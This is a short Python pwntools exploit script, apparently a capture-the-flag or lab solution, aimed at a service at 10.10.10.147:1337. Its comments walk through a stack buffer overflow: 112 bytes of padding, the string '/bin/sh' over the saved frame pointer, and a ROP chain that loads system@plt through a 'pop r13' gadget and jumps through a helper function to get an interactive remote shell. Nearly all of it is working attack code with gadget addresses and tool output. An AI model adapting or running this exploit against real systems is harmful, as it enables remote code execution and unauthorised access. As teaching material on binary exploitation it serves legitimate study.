#!/usr/bin/python3

from pwn import *
# First we need to determine the offset and
# following the next bytes to perform the system("/bin/sh"); execution



"""
|---112 bytes---|---8 bytes (saved RBP)--|---8 bytes (saved RIP)--|
|   Buffer A's  |   /bin/sh\x00           |   dirección de system |
"""


context(terminal=["tmux", "new-window"])
context(os="linux", arch="amd64")

offset = b"A"*112
cmd = b"/bin/sh\x00"
process = remote("10.10.10.147", 1337)
# now with this parametersr, we need to know the moment to call another function
# to overwrite the rdi and use the system and of course call this registers with the code

"""
    00401152 55              PUSH       RBP
    00401153 48 89 e5        MOV        RBP,RSP => as in the stack, the rdi is "/bin/sh"
    00401156 48 89 e7        MOV        RDI,RSP
    00401159 41 ff e5        JMP        R13 => this should be the system to put it 
"""

# ropper -f myapp --search "pop r13"
# 0x0000000000401206: pop r13; pop r14; pop r15; ret; 
jpm_r14 = p64(0x401206)

# ❯ objdump -D myapp| grep system
#  401040:       ff 25 da 2f 00 00       jmp    *0x2fda(%rip)        # 404020 <system@GLIBC_2.2.5>
#  40116e:       e8 cd fe ff ff          call   401040 <system@plt>
system_to_call = p64(0x401040)

# insert null bytes to avoid the r14, r15 as ropper say that after r13 is r14 and r15 
null_byte = p64(0x0)

# now get the test function

test_function = p64(0x401152)

#   | dirección → gadget (pop r13; ...) |
#   | valor para r13  <--- system()     |
#   | valor para r14  <--- null         |
#   | valor para r15  <--- null         |
#   | siguiente RIP  <--- test()        |

payload = offset + cmd + jpm_r14 + system_to_call  + null_byte + null_byte + test_function
process.sendline(payload)
process.interactive()




